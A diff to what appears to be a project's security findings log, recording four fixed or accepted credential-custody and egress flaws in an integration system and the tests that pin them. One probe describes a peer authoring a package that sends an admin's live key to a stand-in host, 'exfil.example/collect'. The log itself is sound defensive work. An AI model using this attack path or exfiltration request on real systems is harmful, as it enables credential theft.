@@ -6,6 +6,74 @@ the RUN_LOG finding tail. Journey findings keep their `F` ids; later findings us
 
 ## OPEN
 
+- **`org-shared-credential-egress-was-authored-by-the-reader`** (FIXED 2026-08-03, CRITICAL,
+  credential exfiltration - found by the B2+C2 fresh-context review, on the branch BOTH slices
+  documented as safe). B2 and C2 each moved the egress allow-list onto the Cofre item and each
+  reported RUN_SPEC criterion 3 met. Neither looked at the NO-ITEM branch, where both rails fell
+  back to `declaredOriginsForIntegration(actor, key)` - the definition AS THE READER RESOLVES IT.
+  An integration definition resolves per (key, PRINCIPAL): `getForActor` answers the reader's own
+  `private` row before any `org`/`global`/baseline one. So for an ORG-SHARED config (any org-admin
+  connect) a same-org peer with role `user` could `PUT /api/v1/integration-builder/package` their
+  own package under that key - accepted whenever the org held no row for it, i.e. whenever the key
+  resolved to a `global`/legacy-runtime publication or to nothing yet - and thereby author BOTH the
+  action that runs AND the hosts the ADMIN's credential may be sent to. Probe, through documented
+  wire surfaces only: `save {"ok":true,"created":true}`, then `exec {"success":true}` with
+  `https://exfil.example/collect?k=pk-live-...` carrying the org-admin's live key, on the executor
+  rail AND on the automation `api_call` rail. C2's docblock called this branch "ENFORCE the declared
+  hosts" without asking who declared them. The precondition is ordinary: 5 of the 11 shipped
+  packages declare a BARE templated `baseUrl` (`{{api_base}}`, `{{api_access_point}}`,
+  `{{graph_base_url}}` - zoho-sign, adobe-acrobat-sign, invoicexpress, whatsapp, ifthenpay), which
+  binds to nothing, so `mintOrRefreshCredentialShadow` returns null and there is no item.
+  FIXED by resolving the definition as the credential's CUSTODIAN, never the reader
+  (`definitionActorForCredential`), for the ACTION and the ALLOW-LIST alike, from one shared rule
+  both rails call (decisions.md 2026-08-03). Pinned in
+  `api/tests/security/integration-credential-custody.test.ts` (both rails, the literal-host variant,
+  the unstamped-legacy-row fallback, and the fail-closed grounds).
+  LESSON: two independent reviews accepted "the declared hosts" as a safe allow-list because the
+  sentence never named an author. A derivation whose result depends on WHO asks is not a property of
+  the artifact, and a docblock that omits the principal is not a description of the control.
+
+- **`a-rotation-took-credential-custody-on-a-stale-join`** (FIXED 2026-08-03, HIGH, credential
+  custody - same review). `persistRotatedCredentials` guarded custody with
+  `!target.cofreItemId && target.ownerUserId == null`, which describes ONE shape of the problem
+  rather than the rule. It missed the stale join: the item's owner deletes it (a supported
+  `DELETE /cofre/items/:id`), `updateIntegrationCredentialValue` answers `stale`, and the shadow
+  write then minted a FRESH, auto-granted `until_locked` item holding the admin's bundle in the
+  RUNNING user's own Cofre and re-stamped `cofreItemId` onto the row. Probe:
+  `custody after stale re-save: u-admin2`. From there the new owner reads the value through
+  `resolveEnvInjection` and holds the lock switch over a credential they never typed. FIXED by
+  removing the capability rather than widening the guard: `mintOrRefreshCredentialShadow` takes an
+  explicit `ceremony | rotation` mode and the rotation mode has no mint branch, does not touch
+  `boundOrigins`, does not re-grant and does not re-stamp the custodian. Pinned in
+  `api/tests/security/integration-credential-custody.test.ts` (stale join, absent item, the
+  boundOrigins re-bind a peer-triggered rotation used to be able to perform, and the locked case).
+
+- **`lock-did-not-revoke-on-the-automation-backed-branch`** (FIXED 2026-08-03, MEDIUM, credential
+  custody - same review). C2's executor resolved the egress binding only on the `api-call` dispatch
+  path; `browser-steps` and materialised `bash-cli` returned into the automation seam with
+  `credentialFields: resolvedFields` BEFORE the binding was ever consulted, so a LOCKED Cofre item
+  did not stop the decrypted bundle reaching them. Blast radius was bounded by the engine
+  (`automation/template-vars.ts` redacts `{{input.credentials...}}` and only `storageState` is
+  consumed), but "one egress truth" covered one of two branches. FIXED: the binding is resolved
+  BEFORE the dispatch and a `refused` binding refuses both branches - ahead of the automation-seam
+  check, so a revoked credential and a missing seam can never be confused. The ORIGIN half is not
+  enforceable from there and the docblock now says exactly that instead of implying otherwise.
+  Pinned in `api/tests/security/integration-credential-custody.test.ts` (locked refuses, granted
+  proceeds, unbound proceeds).
+
+- **`integration-egress-unbound-when-no-item-and-no-literal-host`** (ACCEPTED 2026-08-03, MEDIUM,
+  credential egress). On the ACTION EXECUTOR rail only, a config with no Cofre item whose definition
+  declares no literal host at all keeps the pre-C2 posture: SSRF guard, no origin binding. The
+  automation `api_call` rail has no such branch (an empty allow-list refuses there by construction).
+  MEASURED before accepting: the class is exactly the bare-templated-`baseUrl` packages - 5 of the
+  11 shipped ones - and refusing it would take the shipped Zoho Sign signing rail offline for every
+  org-shared connect. What the 2026-08-03 fix changed is not whether the branch exists but WHO
+  writes the definition it reads: always a principal who could have connected the credential, never
+  an arbitrary reader. Closes when a templated host can be bound at connect, or at the 2026-08-15
+  Rule-10 cutover when every config carries an item. Characterised by
+  `api/tests/security/integration-credential-custody.test.ts` ("the templated class is not taken
+  offline").
+
 - **`org-shared-config-peer-got-the-author-widened-origin-list`** (FIXED 2026-08-03, CRITICAL,
   credential egress - found by the B2 fresh-context review, NOT by the suite, which pinned the
   residual only in its harmless direction). B2 moved the credential-egress allow-list onto the Cofre
